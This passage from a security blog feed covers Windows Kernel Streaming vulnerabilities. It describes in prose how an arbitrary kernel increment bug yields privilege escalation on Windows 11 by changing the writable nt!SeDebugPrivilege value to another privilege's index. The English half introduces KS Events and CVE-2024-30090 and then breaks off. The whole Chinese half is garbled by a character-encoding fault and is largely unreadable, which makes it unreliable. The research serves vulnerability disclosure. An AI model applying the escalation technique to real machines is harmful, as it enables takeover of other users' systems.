&lt;p&gt;Âú®ÂëºÂè´ IOCTL_KS_ENABLE_EVENT ÊôÇÔºåÊßãÈÄ† KSEVENTDATA ÊåáÂêë Kernel Ë®òÊÜ∂È´î‰ΩçÁΩÆÂæåÔºåks ËôïÁêÜÊôÇÂ∞±ÊúÉÂ∞áÂÆÉ‰ΩúÁÇ∫ Kernel Object ‰æÜÊìç‰ΩúÔºå‰∏¶Ë®ªÂÜäÊåáÂÆöÁöÑ‰∫ã‰ª∂&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÄåÂà∞Ëß∏ÁôºÊôÇÔºåks Â∞±ÊúÉÂ∞áÊàëÂÄëÁµ¶ÁöÑË®òÊÜ∂È´î‰ΩçÁΩÆÂÖßÂÆπ +1ÔºåÂõ†Ê≠§ÊàëÂÄëÈÄôÈÇäÂ∞±Êúâ‰∫Ü‰∏ÄÂÄã kernel ‰ªªÊÑè +1 ÁöÑ primitive ‰∫Ü„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;arbitrary-increment-primitive-to-eop&quot;&gt;Arbitrary increment primitive to EoP&lt;/h3&gt;

&lt;p&gt;Âæû‰ªªÊÑèË®òÊÜ∂È´î‰ΩçÁΩÆ +1 Âà∞ÊèêÊ¨äÊúâË®±Â§öÊñπÊ≥ïÂèØ‰ª•Âà©Áî®ÔºåÂÖ∂‰∏≠ÊúÄÁü•ÂêçÁöÑËé´ÈÅéÊñº &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;Abuse token privilege&lt;/a&gt; ‰ª•Âèä &lt;a href=&quot;https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/&quot;&gt;IoRing&lt;/a&gt;ÔºåÂéüÊú¨‰ª•ÁÇ∫Âà∞ÈÄôÈÇäÂ∞±Â∑Æ‰∏çÂ§öÁµêÊùü‰∫Ü‚Ä¶&lt;/p&gt;

&lt;p&gt;ÁÑ∂ËÄå‰∏äËø∞ÂÖ©Á®ÆÊñπÊ≥ïÂú®ÈÄôÂÄãÊÉÖÂ¢É‰∏≠ÈÉΩÊúâ‰∏ÄÂÆöÁöÑ‰æ∑ÈôêÔºö&lt;/p&gt;

&lt;h4 id=&quot;abuse-token-privilege&quot;&gt;Abuse token Privilege&lt;/h4&gt;
&lt;p&gt;Â¶ÇÊûúÊòØ‰ª• Abuse token privilege ÊñπÊ≥ï‰æÜÂÅöÊèêÊ¨äÔºåÂÖ∂ÈóúÈçµÂú®ÊñºË¶ÜÂØ´ Privileges.Enable Âèä Privileges.PresentÔºåËÄåÊàëÂÄëÊºèÊ¥û‰∏ÄÊ¨°Âè™ËÉΩ +1 ÔºåÂ¶ÇÊûúË¶ÅÊãøÂà∞ SeDebugPrivilege Â∞±ÂøÖÈ†àÂÖ©ÂÄãÊ¨Ñ‰ΩçÈÉΩË¶ÅÂØ´Âà∞ÔºåÈÄôÂÖ©Ê†ºÊ¨Ñ‰ΩçÁöÑÈ†êË®≠Êï∏ÂÄºÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x602880000&lt;/code&gt; Âèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x800000&lt;/code&gt; ÂøÖÈ†àË¶ÅËÆäÊàêÔºå0x602&lt;strong&gt;9&lt;/strong&gt;80000 Âèä 0x&lt;strong&gt;9&lt;/strong&gt;00000Ôºå‰πüÂ∞±ÊòØË™™ÂàÜÂà•ÈÉΩË¶ÅÂêÑÂØ´ 0x10 Ê¨°ÔºåÁ∏ΩÂÖ±Ë¶Å 0x20 Ê¨°ÁöÑÂØ´ÂÖ•ÔºåÊØèÊ¨°ÁöÑÂØ´ÂÖ•ÈÉΩË¶Å raceÔºåÈúÄË¶ÅËä±‰∏ä‰∏çÂ∞ëÊôÇÈñìÔºåÁ©©ÂÆöÂ∫¶‰πüÂ§ßÂπÖ‰∏ãÈôç„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;ioring&quot;&gt;IoRing&lt;/h4&gt;
&lt;p&gt;ÈÄèÈÅé IoRing ‰æÜÈÅîÂà∞‰ªªÊÑèÂØ´ÂÖ•Ôºå‰πüË®±ÊúÉÊòØÂÄãÊõ¥Á∞°ÂñÆÁöÑÊñπÊ≥ïÔºåÂè™ÈúÄË¶ÜÂØ´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoRing-&amp;gt;RegBuffersCount&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoRing-&amp;gt;RegBuffers&lt;/code&gt; Â∞±ÂèØÈÅîÂà∞‰ªªÊÑèÂØ´ÂÖ•ÔºåÁÑ∂ËÄåÊúâÂÄãÂïèÈ°åÂ∞±ÁôºÁîü‰∫Ü‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú®Ëß∏Áôº‰ªªÊÑèË®òÊÜ∂È´î‰ΩçÁΩÆ +1 ÈÄôÂÄã primitive ÊôÇÔºåÂ¶ÇÊûúÂéüÂÖàÁöÑÊï∏ÂÄºÊòØ 0 ÊôÇÔºåÂ∞±ÊúÉÈÄ≤Âà∞ KsQueueWorkItem ‰∏≠ÔºåÂÖ∂‰∏≠ÊúÉÊúâ‰∏Ä‰∫õÁõ∏Â∞çÊáâË§áÈõúÁöÑËôïÁêÜÔºåÂ∞±ÊúÉÂ∞éËá¥ BSoDÔºå IoRing ÁöÑÂà©Áî®ÊñπÂºèÂâõÂ•ΩÂ∞±ÊúÉÈÅáÂà∞ÈÄôÁãÄÊ≥Å‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊòØ‰∏çÊòØÁúüÁöÑÊ≤íËæ¶Ê≥ïÁ©©ÂÆöÂà©Áî®‰∫ÜÂë¢?&lt;/p&gt;

&lt;h4 id=&quot;lets-find-a-new-way-&quot;&gt;Let‚Äôs find a new way !&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;Áï∂ÂÇ≥Áµ±ÁöÑÂà©Áî®ÊñπÊ≥ïÈÅáÂà∞Áì∂È†∏ÊôÇÔºåÊ∑±ÂÖ•Êé¢Ë®éÊäÄË°ìÁöÑÊ†∏ÂøÉÊ©üÂà∂ÂèØËÉΩÊúÉÊòØÂÄºÂæóÁöÑ„ÄÇ‰Ω†ÊàñË®±ÊúÉÂú®Ê≠§ÈÅéÁ®ã‰∏≠ÊÑèÂ§ñÁôºÁèæÊñ∞ÁöÑÊñπÊ≥ï„ÄÇ&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Á∂ìÈÅéÂπæÂ§©Ê≤âÊÄù‰πãÂæåÔºåÊàëÂÄëÊ±∫ÂÆöÊâæÂ∞ãÊñ∞ÊñπÊ≥ïÔºå‰ΩÜÂæûÈ†≠ÊâæÊñ∞ÁöÑÊñπÊ≥ïÂèØËÉΩÊúÉËä±‰∏çÂ∞ëÊôÇÈñì‰πüÂèØËÉΩÊâæ‰∏çÂà∞ÔºåÊñºÊòØÊàëÂÄëÊ±∫ÂÆöÂæûËàäÊúâÁöÑÂÖ©ÂÄãÊñπÊ≥ï‰∏≠ÊâæÂ∞ãÊñ∞ÁöÑÈùàÊÑüÔºåÈ¶ñÂÖà‰æÜÁúãÁöÑÊòØ Abuse token privilegeÔºåÂÖ∂‰∏≠ÊúÄÈóúÈçµÁöÑÂ∞±ÊòØÂà©Áî®ÊºèÊ¥ûÊãøÂà∞ SeDebugPrivilege ‰ΩøÂæóÊàëÂÄëÂèØ‰ª• Open ÂÉèÊòØ winlogon Á≠âÈ´òÊ¨äÈôêÁöÑ Process„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂïèÈ°åÂ∞±‰æÜ‰∫ÜÔºå&lt;strong&gt;ÁÇ∫‰ªÄÈ∫ºÂè™Ë¶ÅÊúâ SeDebugPrivilege Â∞±ÂèØ‰ª•ÈñãÂïüÈ´òÊ¨äÈôêÁöÑ Process Âë¢Ôºü&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ÈÄôÈÇäÂ∞±Ë¶Å‰æÜÁúã‰∏Ä‰∏ã PsOpenProcessÔºå‰ª•‰∏ãÊòØ PsOpenProcess ÁöÑÁ®ãÂºèÁ¢ºÁâáÊÆµÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Áî±Ê≠§ÂèØË¶ãÔºåÁï∂ÊàëÂÄëÂú® Open Process ÊôÇÔºå kernel ÊúÉÂÑ™ÂÖà‰ΩøÁî® SeSinglePrivilegeCheck Ê™¢Êü•‰Ω†ÊòØÂê¶Êúâ SeDebugPrivilegeÔºåÂ¶ÇÊûú‰Ω†ÂÖ∑Êúâ SeDebugPrivilege ÈÇ£Â∞±ÊúÉÁµ¶‰Ω† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PROCESS_ALL_ACCESS&lt;/code&gt; ÁöÑÊ¨äÈôêÔºå‰∏çÊúÉÊúâÂÖ∂‰ªñ ACL ÁöÑÊ™¢Êü•ÔºåËÆì‰Ω†ÂèØ‰ª•Â∞ç‰ªªÊÑè Process ÂéªÂÅö‰ªª‰Ωï‰∫ãÊÉÖÔºåÈ°ßÂêçÊÄùÁæ©Â∞±ÊòØËÆì‰Ω† Debug Áî®ÁöÑÔºåÁÑ∂ËÄåÊúâ‰∏ÄÈªûÂÄºÂæóÊ≥®ÊÑèÁöÑÂú∞ÊñπÊòØ SeDebugPrivilege ÊòØÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntoskrnl.exe&lt;/code&gt; ‰∏äÁöÑÂÖ®ÂüüËÆäÊï∏„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÂÆÉÊúÉÊòØÂÄã &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-luid&quot;&gt;LUID&lt;/a&gt; ÁµêÊßãÔºåÊúÉÂú®Á≥ªÁµ±ÂïüÂãïÊôÇÂàùÂßãÂåñÔºåÂØ¶ÈöõÊï∏ÂÄºÁÇ∫ 0x14 ÔºåË°®Á§∫Âú® Privileges.Enable Âèä Privileges.Present Ê¨Ñ‰Ωç‰∏≠Âì™ÂÄã bit ÊòØ‰ª£Ë°® SeDebugPrivilege„ÄÇÊâÄ‰ª•Áï∂ÊàëÂÄëÂú®Áî® NtOpenProcess ÊôÇÔºåÁ≥ªÁµ±ÂéªÊü•ÁúãÈÄôÂÄãÂÖ®ÂüüËÆäÊï∏‰∏≠ÁöÑÊï∏ÂÄº„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Áç≤ÂæóË¶ÅÊ™¢Êü•ÁöÑÊï∏ÂÄºÂæåÔºåÂ∞±ÊúÉ‰æùÁÖßÈÄôÂÄãÊï∏ÂÄºÂéªÊ™¢Êü• Token ‰∏≠ÁöÑ Privileges Ê¨Ñ‰ΩçÊòØÂê¶Êúâ Enable Âèä Present ÈÄôÂÄãÊ¨Ñ‰ΩçÔºå‰ª• SeDebugPrivilege ‰æÜË™™Â∞±ÊúÉÊ™¢Êü•&lt;strong&gt;Á¨¨ 0x14 bit&lt;/strong&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÁÑ∂ËÄåÊúâ‰∏Ä‰ª∂ÊúâË∂£ÁöÑ‰∫ãÊÉÖÊòØ‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; ÈÄôÂÄãÂÖ®ÂüüËÆäÊï∏ÊòØ&lt;strong&gt;‰ΩçÊñºÂèØÂØ´ÁöÑÂçÄÊÆµ‰∏≠&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;Âõ†Ê≠§‰∏ÄÂÄãÊñ∞ÁöÑÊÉ≥Ê≥ïÂ∞±Ë™ïÁîü‰∫Ü„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;make-abusing-token-privilege-great-again-&quot;&gt;Make abusing token privilege great again !&lt;/h4&gt;

&lt;p&gt;È†êË®≠ÊÉÖÊ≥Å‰∏ãÔºå‰∏ÄËà¨Ê¨äÈôêÁöÑ‰ΩøÁî®ËÄÖÊúÉÂÉèÈÄôÂºµÂúñ‰∏ÄÊ®£ÔºåÂÉÖÊúâÂ∞ëÊï∏ÁöÑ Privileges&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰∏çÈÅéÊàëÂÄëÂèØ‰ª•Ê≥®ÊÑèÂà∞ÁöÑÊòØÔºåÂ§ßÈÉ®ÂàÜÊÉÖÊ≥Å‰∏ãÈÉΩÊúÉÊúâ SeChangeNotifyPrivilege ‰∏îÊòØ Enable ÁöÑ„ÄÇÈÄôÊôÇÊàëÂÄëÂ∞±ÂèØ‰ª•‰æÜÁúãÁúãÂàùÂßãÂåñÁöÑÂú∞ÊñπÔºåÂ∞±ÂèØÁôºÁèæ SeChangeNotifyPrivilege ÊâÄ‰ª£Ë°®ÊòØÊï∏ÂÄºÁÇ∫ 0x17„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈÇ£Â¶ÇÊûúÊàëÂÄëÂà©Áî®ÊºèÊ¥ûÊää SeDebugPrivilege Âæû 0x14 ÊèõÊàê 0x17 ÊúÉÁôºÁîüÁîöÈ∫º‰∫ãÊÉÖÂë¢?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Â¶Ç‰∏äÂúñÔºåÂú®ÂéüÂÖà OpenProcess ÁöÑÊµÅÁ®ã‰∏≠Ôºå‰æùËàäÊúÉÂÖàÂéªÁúã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; ‰∏≠ÁöÑÊï∏ÂÄºÔºåËÄåÈÄôÊôÇÁç≤ÂæóÁöÑÊï∏ÂÄºÁÇ∫ 0x17(SeChangeNotifyPrivilege)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Êé•‰∏ã‰æÜÁöÑÊ™¢Êü•Â∞±ÊúÉ‰ª• 0x17 Â∞çÁï∂Ââç Process token ÂÅöÈ©óË≠âÔºåÁúãÁúãÊúâÊ≤íÊúâÈÄôÂÄã PrivilegeÔºåÁÑ∂ËÄå‰∏ÄËà¨‰ΩøÁî®ËÄÖÈÉΩÊúÉÊúâÈÄôÂÄã PrivilegeÔºåÂõ†Ê≠§Âç≥‰Ωø‰Ω†Ê≤íÊúâ SeDebugPrivilege ‰πüÊúÉÁõ¥Êé•ÈÄöÈÅéÊ™¢Êü•ÔºåÊãøÂà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PROCESS_ALL_ACCESS&lt;/code&gt;Ôºå&lt;strong&gt;‰πüÂ∞±ÊòØË™™‰ªª‰ΩïÊìÅÊúâ SeChangeNotifyPrivilege ÈÉΩÂèØ‰ª• open Èô§‰∫Ü PPL ‰πãÂ§ñÁöÑÈ´òÊ¨äÈôêÁöÑ Process&lt;/strong&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;Ê≠§Â§ñÂà©Áî®ÊàëÂÄë‰∏äËø∞ÁöÑÊºèÊ¥û‰æÜÂ∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; Âæû 0x14 ÊîπÊàê 0x17ÔºåÂõ†ÁÇ∫ÂéüÊú¨ÁöÑÊï∏ÂÄº‰∏çÊòØ 0 ÊòØ‰∏çÊúÉÂèóÂà∞ KsQueueWorkItem ÂΩ±ÈüøÁöÑÔºåÂõ†Ê≠§ÈùûÂ∏∏ÈÅ©ÂêàÊàëÂÄë„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú®ÂèØ‰ª• open È´òÊ¨äÈôêÁöÑ Process ÂæåÔºåÊèêÊ¨äÊñπÂºèÂ∞±Ëàá‰∏ÄËà¨ÁöÑ Abuse token privilege ÊñπÊ≥ïÁõ∏ÂêåÂ∞±‰∏çÂÜçÈÄôÈÇäÂ§öÊèê‰∫ÜÔºåÊúÄÁµÇÊàëÂÄëÂèàÂú®‰∏ÄÊ¨°Âà©Áî® Proxying to kernel ÊàêÂäüÂú® Windows 11 23H2 ‰∏äÈÅîÊàê EoP„ÄÇ&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/m2TNVDgz7CI?si=YJQ9_u7xoyVt1wRm&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h4 id=&quot;remark&quot;&gt;Remark&lt;/h4&gt;
&lt;p&gt;ÂØ¶Èöõ‰∏ä‰æÜË™™ÔºåÈÄôÂÄãÊñπÊ≥ï‰πüÈÅ©Áî®ÊñºÂÖ∂‰ªñÈ´òÊ¨äÈôêÁöÑ Privilege ‰∏≠&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;SeTcbPrivilege = 0x7&lt;/li&gt;
  &lt;li&gt;SeTakeOwnershipPrivilege = 0x9&lt;/li&gt;
  &lt;li&gt;SeLoadDriverPrivilege = 0xa&lt;/li&gt;
  &lt;li&gt;‚Ä¶&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;the-next--summary&quot;&gt;The Next &amp;amp; Summary&lt;/h2&gt;
&lt;p&gt;ÈÄôÂÖ©ÁØáÊñáÁ´†‰∏≠Ôºå‰∏ªË¶ÅËëóÈáçÊñºÊàëÂÄëÊÄéÈ∫ºÂæûÈÅéÂæÄÁöÑÊºèÊ¥ûÂàÜÊûêÂà∞ÁôºÁèæÊñ∞ÊºèÊ¥ûÁöÑÈÅéÁ®ãÔºåÂ¶Ç‰ΩïÂæûÈÅéÂéªÁöÑÁ†îÁ©∂‰πã‰∏≠Áç≤ÂæóÊñ∞ÁöÑÊÉ≥Ê≥ï„ÄÅÊñ∞ÁöÑÂà©Áî®ÊñπÂºèÔºåÊñ∞ÁöÑÊºèÊ¥û‰ª•ÂèäÊñ∞ÁöÑÊîªÊìäÈù¢„ÄÇÈóúÊñºÈÄôÁ®Æ Proxy È°ûÂûãÁöÑ Bug class ÂèØËÉΩÈÇÑÂ≠òÂú®ÂæàÂ§öÔºå‰πüÂèØËÉΩ‰∏çÂè™‰æ∑ÈôêÊñº Kernel Streaming Âíå &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest&quot;&gt;IoBuildDeviceIoControlRequest&lt;/a&gt;ÔºåÊàëË™çÁÇ∫ÁÆóÊòØ Windows Ë®≠Ë®à‰∏äÁöÑ‰∏ÄÂÄãÂ∞èÁº∫Èô∑ÔºåÂ¶ÇÊûúË™çÁúüÊâæÂèØËÉΩÈÇÑÊúÉÊâæÂà∞‰∏Ä‰∫õÊºèÊ¥ûÔºåÈÄôÈ°ûÂûãÁöÑÊºèÊ¥û‰Ω†ÈúÄË¶ÅÈóúÊ≥®ÁöÑÂú∞ÊñπÂ∞±ÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; Ë®≠ÁΩÆÁöÑÊôÇÈñìÈªûÔºåÂ¶ÇÊûúË®≠ÁΩÆ KernelMode ‰πãÂæåÈÇÑÊúâÊãø‰ΩøÁî®ËÄÖÁöÑËº∏ÂÖ•ÂÅö‰∫ãÊÉÖÔºåÂ∞±ÊúâÊ©üÊúÉÂá∫ÂïèÈ°åÔºåËÄå‰∏îÈÄôÈ°ûÂûãÁöÑÊºèÊ¥ûÂæÄÂæÄÈÉΩÂæàÂ•ΩÁî®„ÄÇ&lt;/p&gt;

&lt;p&gt;Âú® Kernel Streaming ‰∏≠ÔºåÊàëË™çÁÇ∫ÊáâË©≤‰∏çÂ∞ëÊΩõÂú®ÁöÑÂÆâÂÖ®ÊÄßÊºèÊ¥ûÔºå‰ªñ‰πüÈÇÑÊúâÂæàÂ§öÂÖÉ‰ª∂ÂÉèÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hdaudio.sys&lt;/code&gt; ÊàñÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Usbvideo.sys&lt;/code&gt; ÂèØËÉΩ‰πüÊòØÂÄãÂèØ‰ª•ÁúãÁöÑÊñπÂêëÔºå‰πüÊòØÂÄãÈÅ©Âêà fuzzing ÁöÑÂú∞Êñπ„ÄÇÂ¶ÇÊûú‰Ω†ÊòØÂÄã Kernel driver ÈñãÁôºËÄÖÊúÄÂ•Ω‰∏çË¶ÅÂè™ÊúâÊ™¢Êü• Irp-&amp;gt;RequestormodeÔºåWindows Êû∂Êßã‰∏ãÂæàÊúâÂèØËÉΩÈÇÑÊòØÊúâÂïèÈ°å„ÄÇÊúÄÂæåÂÜçÊ¨°Âº∑ÁÉàÂª∫Ë≠∞Â§ßÂÆ∂Áõ°ÈÄüÊõ¥Êñ∞ Windows Âà∞ÊúÄÊñ∞ÁâàÊú¨‰∏≠„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;is-that-the-end-of-it-&quot;&gt;Is that the end of it ?&lt;/h2&gt;
&lt;p&gt;ÂØ¶Èöõ‰∏ä‰æÜË™™Èô§‰∫Ü Proxy È°ûÂûãÁöÑÊºèÊ¥û‰πãÂ§ñÔºåÊàëÂÄëÈÇÑÊúâÊâæÂà∞ÂÖ∂‰ªñÊõ¥Â§öÁöÑ Bug class ‰ΩøÂæóÊàëÂÄëÂú® Kernel Streaming ‰∏äÊâæÂà∞Ë∂ÖÈÅé 20 ÂÄãÊºèÊ¥ûÔºåÊúâ‰∫õÊºèÊ¥ûÈùûÂ∏∏ÁâπÂà•ÔºåÊï¨Ë´ãÊúüÂæÖ Part III„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;Easy Local Windows Kernel Exploitation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/&quot;&gt;One I/O Ring to Rule Them All: A Full Read/Write Exploit Primitive on Windows 11
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2/</link>
                <guid>https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2</guid>
                <pubDate>Sat, 05 Oct 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part II</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This is a series of research related to Kernel Streaming attack surface. It is recommended to read the following articles first.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/&quot;&gt;Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part I&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In the previous research on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Proxying to Kernel&lt;/code&gt;, we discovered multiple vulnerabilities in Kernel Stearming as well as an overlooked bug Class. We successfully exploited vulnerabilities CVE-2024-35250 and CVE-2024-30084 to compromise Windows 11 at Pwn2Own Vancouver 2024.&lt;/p&gt;

&lt;p&gt;In this article, we will continue to explore this attack surface and bug Class, revealing another vulnerability and exploitation technique, which was also presented at &lt;a href=&quot;https://www.hexacon.fr/&quot;&gt;HEXACON 2024&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;After Pwn2Own Vancouver 2024, we continued to investigate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!KsSynchronousIoControlDevice&lt;/code&gt; bug pattern to see if there were any other security issues. However, after some time, we did not find any other exploitable points in the property operations of KS object. Therefore, we shifted our focus to another feature, KS Event.&lt;/p&gt;

&lt;h2 id=&quot;ks-event&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-events&quot;&gt;KS Event&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Similar to the &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/#ks-property&quot;&gt;KS Property&lt;/a&gt; mentioned in the previous article, the KS object not only has its own property set but also provides the functionality to set KS Event. For instance, you can set an event to trigger when the device status changes or at regular intervals, which is convenient for developers of playback software to define subsequent behaviors. Each KS Event, like a property, requires the KS object to support it to be used. We can register or disable these Events through &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_enable_event&quot;&gt;IOCTL_KS_ENABLE_EVENT&lt;/a&gt; and &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_disable_event&quot;&gt;IOCTL_KS_DISABLE_EVENT&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;kseventdata&quot;&gt;KSEVENTDATA&lt;/h3&gt;
&lt;p&gt;When registering a KS Event, you can register the desired event by providing &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ns-ks-kseventdata&quot;&gt;KSEVENTDATA&lt;/a&gt;. You can include handles such as EVENT_HANDLE and SEMAPHORE_HANDLE in the registration. When KS triggers this event, it will notify you using the provided handle.&lt;/p&gt;

&lt;h3 id=&quot;the-work-flow-of-ioctl_ks_enable_event&quot;&gt;The work flow of IOCTL_KS_ENABLE_EVENT&lt;/h3&gt;
&lt;p&gt;The entire work flow is similar to IOCTL_KS_PROPERTY. When calling DeviceIoControl, as shown in the figure below, the user‚Äôs requests are sequentially passed to the corresponding driver for processing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Similarly, in step 3, 32-bit requests will be converted into 64-bit requests. By step 6, ks.sys will determine which driver and &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/nc-ks-pfnksaddevent&quot;&gt;addhandler&lt;/a&gt; to handle your request based on the event of your requests.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, forward it to the corresponding driver. As shown in the figure above, it is finally forwarded to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsiDefaultClockAddMarkEvent&lt;/code&gt; in ks to set the &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-kesettimerex&quot;&gt;timer&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;After grasping the KS Event functionality and process, we swiftly identified another exploitable vulnerability, &lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-30090&quot;&gt;CVE-2024-30090&lt;/a&gt;, based on the previous¬†&lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/#the-new-bug-pattern&quot;&gt;bug pattern&lt;/a&gt;.&lt;/p&gt;

